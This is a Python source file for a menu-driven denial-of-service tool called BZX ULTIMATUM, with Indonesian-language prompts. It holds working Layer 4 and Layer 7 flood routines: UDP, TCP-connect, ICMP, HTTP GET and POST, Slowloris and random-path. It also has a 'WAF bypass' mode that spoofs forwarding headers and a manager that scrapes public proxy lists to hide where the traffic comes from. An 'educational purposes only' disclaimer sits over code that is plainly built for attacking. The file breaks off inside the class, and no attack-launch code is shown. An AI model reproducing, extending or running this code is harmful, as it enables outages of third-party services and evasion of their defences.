#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BZX ULTIMATUM v4.1 - DEWA SPEK PREMIUM + AUTO PROXY
# FOR EDUCATIONAL PURPOSES ONLY - TEST ON YOUR OWN SERVERS
# https://github.com/bzdev1/bzx-ultimatum

import socket
import threading
import time
import random
import sys
import os
import ssl
import requests
from urllib.parse import urlparse
from datetime import datetime
import signal
import json
import base64
import hashlib
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Colorama fallback
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except:
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'; BLUE = '\033[94m'
        MAGENTA = '\033[95m'; CYAN = '\033[96m'; WHITE = '\033[97m'; RESET = '\033[0m'
    class Style:
        BRIGHT = '\033[1m'; DIM = '\033[2m'; NORMAL = '\033[22m'; RESET_ALL = '\033[0m'

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RS = Style.RESET_ALL

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BANNER ULTIMATUM v4.1
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║    ██████╗ ███████╗██╗  ██╗   ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗██╗   ██╗███╗   ███╗
║    ██╔══██╗██╔════╝╚██╗██╔╝   ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██║   ██║████╗ ████║
║    ██████╔╝█████╗   ╚███╔╝    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   ██║   ██║██╔████╔██║
║    ██╔══██╗██╔══╝   ██╔██╗    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
║    ██████╔╝███████╗██╔╝ ██╗██╗╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
║    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
║                                                                                  ║
║{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}║
║{C}                     DDOS ULTIMATUM v4.1 - DEWA SPEK PREMIUM                      {R}║
║{Y}                  FOR EDUCATIONAL PURPOSES ONLY - BZX EDITION                    {R}║
║{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}║
║                                                                                  ║
║{M}                      ⚡ LAYER 4 & LAYER 7 ATTACKS ⚡                              {R}║
║{M}                 🔥 15+ ATTACK METHODS | UNLIMITED THREADS 🔥                   {R}║
║{M}                 💀 REAL-TIME STATS | AUTO PROXY | BYPASS WAF 💀               {R}║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RS}"""

DISCLAIMER = f"""
{R}╔══════════════════════════════════════════════════════════════════════════════╗
║                         🔴 LEGAL WARNING 🔴                                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  {Y}[!] TOOL INI HANYA UNTUK TUJUAN PENDIDIKAN DAN PENETRATION TESTING{RS}{R}          ║
║  {Y}[!] DILARANG KERAS DIGUNAKAN UNTUK SERANGAN ILEGAL{RS}{R}                         ║
║  {Y}[!] HANYA BOLEH DIGUNAKAN DI SERVER SENDIRI / LAB{RS}{R}                         ║
║  {Y}[!] MELANGGAR UU ITE = PIDANA PENJARA (Pasal 30-36){RS}{R}                       ║
║  {Y}[!] DEVELOPER TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN{RS}{R}                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  {G}✓ Dengan menggunakan tool ini, Anda menyetujui disclaimer di atas{RS}{R}         ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RS}"""

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  AUTO PROXY MANAGER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AutoProxyManager:
    """Auto fetch proxy dari berbagai sumber"""
    def __init__(self):
        self.proxies = []
        self.live_proxies = []
        self.lock = threading.Lock()
        self.proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxyscan.io/download?type=http"
        ]
        
    def fetch_from_source(self, url):
        """Ambil proxy dari satu sumber"""
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                # Extract IP:port menggunakan regex
                proxies = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b', r.text)
                with self.lock:
                    self.proxies.extend(proxies)
                print(f"{G}[✓] {len(proxies)} proxy dari {url.split('/')[2]}{RS}")
                return proxies
        except Exception as e:
            print(f"{R}[✗] Gagal fetch {url.split('/')[2]}: {str(e)[:30]}{RS}")
        return []
    
    def fetch_all(self):
        """Ambil proxy dari semua sumber"""
        print(f"{Y}[*] Fetching proxies dari {len(self.proxy_sources)} sumber...{RS}")
        self.proxies = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self.fetch_from_source, url): url for url in self.proxy_sources}
            for future in as_completed(futures):
                future.result()
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"{G}[✓] Total {len(self.proxies)} proxy unik terkumpul{RS}")
        return self.proxies
    
    def test_proxy(self, proxy, timeout=5):
        """Test apakah proxy hidup"""
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
            if r.status_code == 200:
                return True, proxy
        except:
            pass
        return False, proxy
    
    def test_all(self, max_threads=50, max_proxies=300):
        """Test semua proxy yang terkumpul"""
        print(f"{Y}[*] Testing {min(len(self.proxies), max_proxies)} proxy...{RS}")
        
        test_proxies = self.proxies[:max_proxies]
        self.live_proxies = []
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_proxy, p): p for p in test_proxies}
            for future in as_completed(futures):
                is_live, proxy = future.result()
                if is_live:
                    self.live_proxies.append(proxy)
                    print(f"{G}[✓] LIVE: {proxy}{RS}")
        
        print(f"{G}[✓] Ditemukan {len(self.live_proxies)} proxy hidup{RS}")
        return self.live_proxies
    
    def save_to_file(self, filename='proxies.txt', live_only=True):
        """Simpan proxy ke file"""
        proxies_to_save = self.live_proxies if live_only else self.proxies
        try:
            with open(filename, 'w') as f:
                for p in proxies_to_save:
                    f.write(p + '\n')
            print(f"{G}[✓] Tersimpan {len(proxies_to_save)} proxy ke {filename}{RS}")
            return True
        except Exception as e:
            print(f"{R}[✗] Gagal simpan: {e}{RS}")
            return False

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BZX ULTIMATUM CLASS - DEWA SPEK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class BzxUltimatum:
    def __init__(self):
        # Target config
        self.target_ip = ""
        self.target_url = ""
        self.target_port = 80
        self.use_ssl = False
        self.target_path = "/"
        
        # Attack config
        self.threads = 100
        self.duration = 60
        self.delay = 0.001
        self.packet_size = 1024
        self.attack_method = "1"
        self.attack_name = "UDP Flood (Layer 4)"
        self.attack_func = None
        
        # Proxy config - PAKE AUTO PROXY MANAGER
        self.proxy_manager = AutoProxyManager()
        self.use_proxy = False
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        self.auto_refresh_proxy = True
        
        # Stats
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.requests_sent = 0
        self.failed_attempts = 0
        self.start_time = 0
        self.lock = threading.Lock()
        
        # HTTP Headers for Layer 7
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        ]
        
        self.referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.youtube.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/"
        ]
        
        self.paths = [
            "/", "/index.html", "/home", "/login", "/admin", 
            "/wp-admin", "/wp-login.php", "/api/v1", "/api/users",
            "/search", "/products", "/category", "/blog", "/about"
        ]
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  MENU SYSTEM
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def print_menu(self):
        self.clear_screen()
        print(BANNER)
        print(DISCLAIMER)
        
        print(f"{C}┌──────────────────────────────────────────────────────────────────────────────────┐{RS}")
        print(f"{C}│{W}                            BZX ULTIMATUM v4.1 - MENU UTAMA                         {C}│{RS}")
        print(f"{C}├──────────────────────────────────────────────────────────────────────────────────┤{RS}")
        print(f"{C}│{G}  1. {W}Set Target (IP/URL)                  {C}│{G}  8. {W}Layer 7 - HTTP Flood               {C}│{RS}")
        print(f"{C}│{G}  2. {W}Set Port (default: 80)                {C}│{G}  9. {W}Layer 7 - HTTPS Flood              {C}│{RS}")
        print(f"{C}│{G}  3. {W}Set Threads (1-9999)                  {C}│{G} 10. {W}Layer 7 - Slowloris                {C}│{RS}")
        print(f"{C}│{G}  4. {W}Set Duration (detik)                  {C}│{G} 11. {W}Layer 7 - POST Flood               {C}│{RS}")
        print(f"{C}│{G}  5. {W}Set Delay/PPS                         {C}│{G} 12. {W}Layer 7 - Random Path              {C}│{RS}")
        print(f"{C}│{G}  6. {W}AUTO PROXY MANAGER                    {C}│{G} 13. {W}Layer 7 - WAF Bypass Mode          {C}│{RS}")
        print(f"{C}│{G}  7. {W}Layer 4 - UDP Flood                   {C}│{G} 14. {W}MIXED MODE - All Attacks           {C}│{RS}")
        print(f"{C}├──────────────────────────────────────────────────────────────────────────────────┤{RS}")
        print(f"{C}│{G} 15. {W}Layer 4 - SYN Flood                   {C}│{G} 16. {W}Layer 4 - ICMP Flood               {C}│{RS}")
        print(f"{C}│{G} 17. {W}Show Current Config                   {C}│{R} 18. 🔥 START ULTIMATUM 🔥            {C}│{RS}")
        print(f"{C}│{G} 19. {W}Stop Attack                           {C}│{R}  0. Exit                           {C}│{RS}")
        print(f"{C}└──────────────────────────────────────────────────────────────────────────────────┘{RS}")
        
        # Status Bar
        print(f"{M}════════════════════════════════════════════════════════════════════════════════{RS}")
        print(f"{W}Target     : {G}{self.target_url or self.target_ip or 'Not set'}{RS}")
        print(f"{W}Port       : {G}{self.target_port} {'(SSL)' if self.use_ssl else ''}{RS}")
        print(f"{W}Threads    : {G}{self.threads}{RS}")
        print(f"{W}Duration   : {G}{self.duration}s{RS}")
        print(f"{W}Delay      : {G}{self.delay}s{RS}")
        print(f"{W}Method     : {G}{self.attack_name}{RS}")
        
        # Proxy status
        proxy_status = f"{G}ACTIVE ({len(self.proxy_manager.live_proxies)} live)" if self.use_proxy else f"{R}INACTIVE"
        print(f"{W}Proxy      : {proxy_status}{RS}")
        if self.use_proxy:
            print(f"{W}Proxy Pool : {G}{len(self.proxy_manager.live_proxies)}/{len(self.proxy_manager.proxies)} live{RS}")
        
        print(f"{M}════════════════════════════════════════════════════════════════════════════════{RS}")
        
        if self.running:
            elapsed = time.time() - self.start_time
            remaining = max(0, self.duration - elapsed)
            print(f"{R}[🔥] ATTACK RUNNING - {remaining:.0f}s remaining{RS}")
            
            # Hitung kecepatan
            if elapsed > 0:
                if "Layer 4" in self.attack_name or "UDP" in self.attack_name or "SYN" in self.attack_name:
                    speed = self.packets_sent / elapsed
                    print(f"{Y}Packets: {self.packets_sent} | Speed: {speed:.0f} pps{RS}")
                else:
                    speed = self.requests_sent / elapsed
                    print(f"{Y}Requests: {self.requests_sent} | Speed: {speed:.0f} rps{RS}")
                    
                bandwidth = self.bytes_sent / elapsed / 1024
                print(f"{Y}Bandwidth: {bandwidth:.2f} KB/s | Total: {self.bytes_sent/1024/1024:.2f} MB{RS}")
                
            if self.failed_attempts > 0:
                print(f"{R}Failed: {self.failed_attempts}{RS}")
                
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  AUTO PROXY MANAGER MENU
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def proxy_menu(self):
        while True:
            self.clear_screen()
            print(f"{C}══════════════════════════════════════════════════════════{RS}")
            print(f"{W}                    AUTO PROXY MANAGER{RS}")
            print(f"{C}══════════════════════════════════════════════════════════{RS}")
            print(f"{G}1. Fetch Proxy dari Internet{RS}")
            print(f"{G}2. Test Semua Proxy (cari yang hidup){RS}")
            print(f"{G}3. Fetch + Test Sekaligus{RS}")
            print(f"{G}4. Simpan ke File (proxies.txt){RS}")
            print(f"{G}5. Load dari File{RS}")
            print(f"{G}6. Toggle Proxy (current: {'ON' if self.use_proxy else 'OFF'}){RS}")
            print(f"{G}7. Auto Refresh (current: {'ON' if self.auto_refresh_proxy else 'OFF'}){RS}")
            print(f"{G}8. Lihat Statistik Proxy{RS}")
            print(f"{G}9. Hapus Semua Proxy{RS}")
            print(f"{R}0. Kembali{RS}")
            print(f"{C}══════════════════════════════════════════════════════════{RS}")
            
            # Show current stats
            print(f"\n{Y}Proxy Stats:{RS}")
            print(f"{W}Total fetched: {G}{len(self.proxy_manager.proxies)}{RS}")
            print(f"{W}Live proxies : {G}{len(self.proxy_manager.live_proxies)}{RS}")
            print(f"{W}Status       : {G}{'ACTIVE' if self.use_proxy else 'INACTIVE'}{RS}")
            
            choice = input(f"\n{Y}Pilih: {RS}").strip()
            
            if choice == '1':
                self.proxy_manager.fetch_all()
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '2':
                if not self.proxy_manager.proxies:
                    print(f"{R}[!] Belum ada proxy. Fetch dulu!{RS}")
                else:
                    max_test = input(f"{Y}Jumlah proxy yang dites (default 300): {RS}").strip()
                    try:
                        max_test = int(max_test) if max_test else 300
                    except:
                        max_test = 300
                    self.proxy_manager.test_all(max_proxies=min(max_test, len(self.proxy_manager.proxies)))
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '3':
                self.proxy_manager.fetch_all()
                max_test = input(f"{Y}Jumlah proxy yang dites (default 300): {RS}").strip()
                try:
                    max_test = int(max_test) if max_test else 300
                except:
                    max_test = 300
                self.proxy_manager.test_all(max_proxies=min(max_test, len(self.proxy_manager.proxies)))
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '4':
                self.proxy_manager.save_to_file('proxies.txt', live_only=True)
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '5':
                try:
                    with open('proxies.txt', 'r') as f:
                        self.proxy_manager.live_proxies = [line.strip() for line in f if line.strip()]
                    print(f"{G}[✓] Loaded {len(self.proxy_manager.live_proxies)} proxies{RS}")
                except:
                    print(f"{R}[✗] File not found{RS}")
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '6':
                self.use_proxy = not self.use_proxy
                if self.use_proxy and not self.proxy_manager.live_proxies:
                    print(f"{Y}[!] No live proxies, fetching...{RS}")
                    self.proxy_manager.fetch_all()
                    self.proxy_manager.test_all(max_proxies=200)
                print(f"{G}[✓] Proxy {'ACTIVATED' if self.use_proxy else 'DEACTIVATED'}{RS}")
                time.sleep(1)
                
            elif choice == '7':
                self.auto_refresh_proxy = not self.auto_refresh_proxy
                print(f"{G}[✓] Auto refresh: {'ON' if self.auto_refresh_proxy else 'OFF'}{RS}")
                time.sleep(1)
                
            elif choice == '8':
                print(f"\n{Y}Proxy Statistics:{RS}")
                print(f"{W}Total fetched    : {G}{len(self.proxy_manager.proxies)}{RS}")
                print(f"{W}Live proxies     : {G}{len(self.proxy_manager.live_proxies)}{RS}")
                print(f"{W}Hit rate         : {G}{len(self.proxy_manager.live_proxies)/max(1,len(self.proxy_manager.proxies))*100:.1f}%{RS}")
                print(f"{W}Proxy active     : {G}{self.use_proxy}{RS}")
                print(f"{W}Auto refresh     : {G}{self.auto_refresh_proxy}{RS}")
                
                if self.proxy_manager.live_proxies:
                    print(f"\n{Y}Sample live proxies:{RS}")
                    for i, p in enumerate(self.proxy_manager.live_proxies[:10], 1):
                        print(f"{G}{i}. {p}{RS}")
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '9':
                self.proxy_manager.proxies = []
                self.proxy_manager.live_proxies = []
                self.use_proxy = False
                print(f"{G}[✓] All proxies cleared{RS}")
                time.sleep(1)
                
            elif choice == '0':
                break
                
    def get_proxy(self):
        """Get random live proxy with auto refresh"""
        if not self.use_proxy:
            return None
            
        # Auto refresh if needed
        if self.auto_refresh_proxy and len(self.proxy_manager.live_proxies) < 5:
            print(f"{Y}[!] Proxy pool low, auto refreshing...{RS}")
            if not self.proxy_manager.proxies:
                self.proxy_manager.fetch_all()
            self.proxy_manager.test_all(max_proxies=100)
            
        if not self.proxy_manager.live_proxies:
            return None
            
        with self.proxy_lock:
            proxy = random.choice(self.proxy_manager.live_proxies)
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  TARGET CONFIG
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def set_target(self):
        print(f"\n{Y}Masukkan target (IP atau URL dengan http/https):{RS}")
        target = input(f"{C}Target: {RS}").strip().lower()
        
        if not target:
            return
            
        # Cek apakah URL atau IP
        if target.startswith(('http://', 'https://')):
            self.target_url = target
            parsed = urlparse(target)
            self.target_ip = parsed.hostname
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.use_ssl = (parsed.scheme == 'https')
            self.target_path = parsed.path or '/'
            print(f"{G}[✓] URL target: {self.target_url}{RS}")
        else:
            # Coba resolve hostname
            try:
                self.target_ip = socket.gethostbyname(target)
                self.target_url = f"http://{target}"
                self.target_port = 80
                self.use_ssl = False
                print(f"{G}[✓] IP target: {self.target_ip}{RS}")
            except:
                print(f"{R}[✗] Invalid target{RS}")
                return
                
        print(f"{G}[✓] Port: {self.target_port}{RS}")
        if self.use_ssl:
            print(f"{G}[✓] SSL Enabled{RS}")
        time.sleep(1)
        
    def set_port(self):
        try:
            port = int(input(f"{Y}Masukkan port (1-65535): {RS}").strip())
            if 1 <= port <= 65535:
                self.target_port = port
                print(f"{G}[✓] Port set to: {self.target_port}{RS}")
            else:
                print(f"{R}[✗] Port harus 1-65535{RS}")
        except:
            print(f"{R}[✗] Invalid port{RS}")
        time.sleep(1)
        
    def set_threads(self):
        try:
            threads = int(input(f"{Y}Masukkan jumlah thread (1-9999): {RS}").strip())
            self.threads = max(1, min(9999, threads))
            print(f"{G}[✓] Threads set to: {self.threads}{RS}")
        except:
            print(f"{R}[✗] Invalid number{RS}")
        time.sleep(1)
        
    def set_duration(self):
        try:
            dur = int(input(f"{Y}Masukkan durasi (detik): {RS}").strip())
            self.duration = max(1, dur)
            print(f"{G}[✓] Duration set to: {self.duration} detik{RS}")
        except:
            print(f"{R}[✗] Invalid duration{RS}")
        time.sleep(1)
        
    def set_delay(self):
        print(f"{Y}Delay antar packet (0 = maksimum kecepatan):{RS}")
        try:
            delay = float(input(f"{Y}Delay (detik, contoh: 0.001): {RS}").strip())
            self.delay = max(0, min(1, delay))
            print(f"{G}[✓] Delay set to: {self.delay} detik{RS}")
        except:
            print(f"{R}[✗] Invalid delay{RS}")
        time.sleep(1)
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  LAYER 4 ATTACKS
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def udp_flood(self):
        """UDP Flood - Layer 4"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(self.packet_size)
        while self.running:
            try:
                sock.sendto(packet, (self.target_ip, self.target_port))
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += self.packet_size
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
                    
    def syn_flood(self):
        """SYN Flood - Layer 4"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                sock.close()
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += 64
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
                    
    def icmp_flood(self):
        """ICMP Flood - Layer 3 (pake ping)"""
        while self.running:
            try:
                if sys.platform == "win32":
                    subprocess.run(['ping', '-n', '1', '-l', str(self.packet_size), self.target_ip], 
                                 capture_output=True, timeout=1)
                else:
                    subprocess.run(['ping', '-c', '1', '-s', str(self.packet_size), self.target_ip],
                                 capture_output=True, timeout=1)
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += self.packet_size
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
                    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  LAYER 7 ATTACKS
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def http_flood(self):
        """HTTP Flood - Layer 7"""
        session = requests.Session()
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Referer': random.choice(self.referers),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                proxies = self.get_proxy()
                
                if self.use_ssl:
                    url = f"https://{self.target_ip}:{self.target_port}{self.target_path}"
                else:
                    url = f"http://{self.target_ip}:{self.target_port}{self.target_path}"
                    
                response = session.get(url, headers=headers, proxies=proxies, timeout=5, verify=False)
                
                with self.lock:
                    self.requests_sent += 1
                    self.bytes_sent += len(response.content)
                    
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
                    
    def https_flood(self):
        """HTTPS Flood - Layer 7 with SSL"""
        self.use_ssl = True
        self.http_flood()
        
    def slowloris(self):
        """Slowloris - Keep connections open"""
        sockets = []
        for _ in range(min(100, self.threads)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                sock.send(f"GET {self.target_path} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en\r\n".encode())
                sockets.append(sock)
            except:
                pass
                
        while self.running:
            for sock in sockets[:]:
                try:
                    sock.send("X-a: b\r\n".encode())
                    with self.lock:
                        self.requests_sent += 1
                        self.bytes_sent += 10
                except:
                    sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
                        
            # Add new sockets
            while len(sockets) < min(100, self.threads) and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, self.target_port))
                    sock.send(f"GET {self.target_path} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {self.target_ip}\r\n".encode())
                    sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                    sock.send("Accept-language: en-US,en\r\n".encode())
                    sockets.append(sock)
                except:
                    pass
                    
            if self.delay > 0:
                time.sleep(self.delay)
                
    def post_flood(self):
        """POST Flood - Layer 7 with POST data"""
        session = requests.Session()
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Referer': random.choice(self.referers),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*'
                }
                
                data = f"data={random._urandom(1024).hex()}"
                proxies = self.get_proxy()
                
                if self.use_ssl:
                    url = f"https://{self.target_ip}:{self.target_port}{self.target_path}"
                else:
                    url = f"http://{self.target_ip}:{self.target_port}{self.target_path}"
                    
                response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=5, verify=False)
                
                with self.lock:
                    self.requests_sent += 1
                    self.bytes_sent += len(response.content) + len(data)
                    
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
                    
    def random_path_flood(self):
        """Random Path Flood - Hit random paths"""
        session = requests.Session()
        while self.running:
            try:
                path = random.choice(self.paths)
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Referer': random.choice(self.referers)
                }
                
                proxies = self.get_proxy()
                
                if self.use_ssl:
                    url = f"https://{self.target_ip}:{self.target_port}{path}"
                else:
                    url = f"http://{self.target_ip}:{self.target_port}{path}"
                    
                response = session.get(url, headers=headers, proxies=proxies, timeout=5, verify=False)
                
                with self.lock:
                    self.requests_sent += 1
                    self.bytes_sent += len(response.content)
                    
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
                    
    def waf_bypass_flood(self):
        """WAF Bypass Mode - Various techniques to bypass WAF"""
        session = requests.Session()
        while self.running:
            try:
                # Random encoding
                encodings = ['gzip', 'deflate', 'br', 'identity']
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Referer': random.choice(self.referers),
                    'Accept-Encoding': random.choice(encodings),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Via': '1.1 google',
                    'X-Custom-Header': base64.b64encode(random._urandom(16)).decode()
                }
                
                proxies = self.get_proxy()
                
                if self.use_ssl:
                    url = f"https://{self.target_ip}:{self.target_port}{self.target_path}"
                else:
                    url = f"http://{self.target_ip}:{self.target_port}{self.target_path}"
                    
                response = session.get(url, headers=headers, proxies=proxies, timeout=5, verify=False)
                
                with self.lock:
                    self.requests_sent += 1
                    self.bytes_sent += len(response.content)
                    
                if self.delay > 0:
                    time.sleep(self.delay)
            except:
                with self.lock:
                    self.failed_attempts += 1
    
    def mixed_mode(self):
        """Mixed Mode - Random attack setiap thread"""
        attacks = [
            self.udp_flood,
            self.syn_flood,
            self.http_flood,
            self.post_flood,
            self.random_path_flood,
            self.waf_bypass_flood
        ]
        random.choice(attacks)()
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  ATTACK CONTROLLER
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def show_config(self):
        self.clear_screen()
        print(f"{C}══════════════════════════════════════════════════════════{RS}")
        print(f"{W}                    CURRENT CONFIGURATION{RS}")
        print(f"{C}══════════════════════════════════════════════════════════{RS}")
        print(f"{W}Target IP     : {G}{self.target_ip or 'Not set'}{RS}")
        print(f"{W}Target URL    : {G}{self.target_url or 'Not set'}{RS}")
        print(f"{W}Port          : {G}{self.target_port}{RS}")
        print(f"{W}SSL           : {G}{self.use_ssl}{RS}")
        print(f"{W}Threads       : {G}{self.threads}{RS}")
        print(f"{W}Duration      : {G}{self.duration}s{RS}")
        print(f"{W}Delay         : {G}{self.delay}s{RS}")
        print(f"{W}Packet Size   : {G}{self.packet_size} bytes{RS}")
        print(f"{W}Attack Method : {G}{self.attack_name}{RS}")
        print(f"{W}Proxy         : {G}{'ACTIVE' if self.use_proxy else 'INACTIVE'}{RS}")
        print(f"{W}Live Proxies  : {G}{len(self.proxy_manager.live_proxies)}{RS}")
